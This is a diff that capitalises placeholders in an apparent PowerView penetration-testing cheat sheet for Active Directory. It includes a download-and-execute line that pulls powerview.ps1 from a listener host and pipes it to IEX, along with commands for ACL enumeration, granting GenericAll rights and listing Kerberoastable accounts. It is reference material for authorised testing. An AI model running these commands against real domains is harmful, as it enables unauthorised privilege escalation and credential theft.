@@ -8,7 +8,7 @@
 https://github.com/PowerShellMafia/PowerSploit/
 
 ```powershell
-(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
+(new-object system.net.webclient).downloadstring('http://<LHOST>/powerview.ps1') | IEX
 ```
 
 ## Set alternative creds to use
@@ -16,7 +16,7 @@ https://github.com/PowerShellMafia/PowerSploit/
 Example : Use with commands as '-Credential $creds'
 
 ```powershell
-$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('<domain>\<user>', $passwd)
+$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ('<DOMAIN>\<USER>', $passwd)
 ```
 
 ## Get User from SID
@@ -28,7 +28,7 @@ ConvertFrom-SID <sid>
 ## Find user ACL 
 #plateform/windows #target/remote  #cat/RECON 
 ```powershell
-Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+Get-ObjectAcl -Identity <USER> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
 ```
 
 ## Find all domain user ACL
@@ -59,7 +59,7 @@ Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -
 ## Add GenericAll to target for user
 #plateform/windows #target/remote  #cat/ATTACK/EXPLOIT 
 ```powerview
-Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All
+Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <USER> -Rights All
 ```
 
 ## Find all Computer with unconstrained delegation
@@ -79,7 +79,7 @@ Get-DomainTrustMapping
 Example: Get-DomainGroupMember 'Domain Admins' -Recurse
 
 ```powershell
-Get-DomainGroupMember -Identity '<group|Administrators>' -Domain <domain> -Recurse
+Get-DomainGroupMember -Identity '<group|Administrators>' -Domain <DOMAIN> -Recurse
 ```
 
 
@@ -89,5 +89,5 @@ Get-DomainGroupMember -Identity '<group|Administrators>' -Domain <domain> -Recur
 Description : The following will enumerate 'Kerberoastable' users for a given domain
 
 ```powershell
-Get-DomainUser -SPN -Domain <domain> | select name, samaccountname, serviceprincipalname
+Get-DomainUser -SPN -Domain <DOMAIN> | select name, samaccountname, serviceprincipalname
 ```
